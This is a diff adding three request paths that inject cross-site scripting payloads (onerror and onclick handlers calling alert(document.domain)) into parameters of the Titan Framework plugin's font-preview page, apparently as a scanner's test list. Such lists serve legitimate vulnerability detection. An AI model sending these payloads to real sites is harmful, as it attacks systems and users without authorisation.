@@ -1,0 +1,3 @@
+/titan-framework/lib/iframe-font-preview.php?font-type=google&font-family=%27/onerror=%27alert(document.domain)%27/b=%27
+/titan-framework/lib/iframe-font-preview.php?font-type=google&font-family=aaaaa&font-weight=%27%20onerror=alert(document.domain)%20b=%27
+/titan-framework/lib/iframe-font-preview.php?font-type=google&font-family=aaaaa&font-weight=%27%20accesskey=%27x%27%20onclick=%27alert(document.domain)%27%20class=%27
